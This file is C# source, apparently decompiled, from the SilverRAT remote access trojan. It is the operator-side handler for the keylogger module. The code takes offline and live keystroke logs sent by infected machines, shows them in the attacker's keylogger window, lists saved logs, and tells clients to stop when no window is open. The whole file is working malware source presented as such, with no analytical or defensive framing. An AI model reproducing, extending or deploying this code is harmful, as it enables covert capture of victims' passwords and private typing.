using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.MessagePack;
using System;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleKeyloaggar
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "Offlien":
                    {
                        Keyloaggar keyloaggar3 = (Keyloaggar)Application.OpenForms["Keylogger:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (keyloaggar3 != null)
                        {
                            keyloaggar3.SbOfflien.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                            keyloaggar3.richTextBoxOfflien.Text = keyloaggar3.SbOfflien.ToString();
                            keyloaggar3.richTextBoxOfflien.SelectionStart = keyloaggar3.richTextBoxOfflien.TextLength;
                            keyloaggar3.richTextBoxOfflien.ScrollToCaret();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Onlien":
                    {
                        Keyloaggar keyloaggar2 = (Keyloaggar)Application.OpenForms["Keylogger:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (keyloaggar2 != null)
                        {
                            keyloaggar2.SbOnlien.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                            keyloaggar2.richTextBoxOnlien.Text = keyloaggar2.SbOnlien.ToString();
                            keyloaggar2.richTextBoxOnlien.SelectionStart = keyloaggar2.richTextBoxOnlien.TextLength;
                            keyloaggar2.richTextBoxOnlien.ScrollToCaret();
                        }
                        else
                        {
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Packet").AsString = "Stop";
                            client.Send(msgPack.Encode2Bytes());
                        }
                        break;
                    }
                case "Actived":
                    {
                        Keyloaggar keyloaggar = (Keyloaggar)Application.OpenForms["Keylogger:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (keyloaggar != null)
                        {
                            if (keyloaggar.Client != null)
                            {
                                break;
                            }
                            keyloaggar.Client = client;
                            keyloaggar.LoaderConnect.Visible = false;
                            keyloaggar.Timer1.Start();
                            try
                            {
                                keyloaggar.ComboxLogs.Items.Clear();
                                string asString = unpack_msgpack.ForcePathObject("Loags").AsString;
                                string[] array = asString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                                string[] array2 = array;
                                foreach (string text in array2)
                                {
                                    if (text.Length > 0)
                                    {
                                        keyloaggar.ComboxLogs.Items.Add(text);
                                    }
                                }
                                if (keyloaggar.ComboxLogs.Items.Count > 0)
                                {
                                    keyloaggar.ComboxLogs.SelectedIndex = 0;
                                }
                                break;
                            }
                            catch
                            {
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
